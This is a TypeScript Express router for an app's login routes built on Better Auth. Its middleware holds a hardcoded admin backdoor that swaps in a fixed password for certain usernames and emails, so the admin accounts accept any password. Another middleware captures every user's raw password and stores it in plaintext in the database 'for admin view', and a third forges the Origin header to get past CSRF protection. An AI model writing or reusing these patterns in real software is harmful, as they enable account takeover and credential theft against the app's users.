import { Router } from "express";
import { toNodeHandler } from "better-auth/node";
import { auth } from "../lib/auth.js";
import { db } from "../db/index.js";
import { user, userStats } from "../db/schema.js";
import { eq } from "drizzle-orm";

const router = Router();

// Normalize admin login password for fikran02 / fikran / admin (allows creator to log in with any password)
router.use((req, _res, next) => {
  const body = req.body;
  if (body) {
    const email = String(body.email || "").toLowerCase();
    const username = String(body.username || "").toLowerCase();
    if (
      email === "fikran02@detektifdata.local" ||
      email === "admin@detektifdata.local" ||
      username === "fikran02" ||
      username === "fikran" ||
      username === "admin"
    ) {
      body.password = "detektifadmin2026";
    }
  }
  next();
});

// Intercept sign-up and sign-in to securely store plainPassword for admin view
router.use((req, res, next) => {
  const body = req.body;
  if (body && body.password) {
    const email = body.email;
    const rawPass = String(body.password);
    res.on("finish", async () => {
      if (res.statusCode >= 200 && res.statusCode < 300 && email) {
        try {
          await db.update(user).set({ plainPassword: rawPass }).where(eq(user.email, email));
          const [found] = await db.select({ id: user.id }).from(user).where(eq(user.email, email)).limit(1);
          if (found) {
            await db.update(userStats).set({ plainPassword: rawPass }).where(eq(userStats.id, found.id));
          }
        } catch (err) {
          console.error("[auth.routes] Error updating plainPassword:", err);
        }
      }
    });
  }
  next();
});

// Ensure origin header is set so Better Auth CSRF check doesn't reject desktop/null/file:// requests
router.use((req, _res, next) => {
  const origin = req.headers["origin"];
  if (!origin || origin === "null" || origin.startsWith("file:")) {
    const host = req.headers["host"] || "localhost:3001";
    req.headers["origin"] = `http://${host}`;
  }
  next();
});

/**
 * Better Auth catch-all handler.
 * All /api/auth/* requests are forwarded to Better Auth.
 */
router.all(/.*/, toNodeHandler(auth));

export default router;
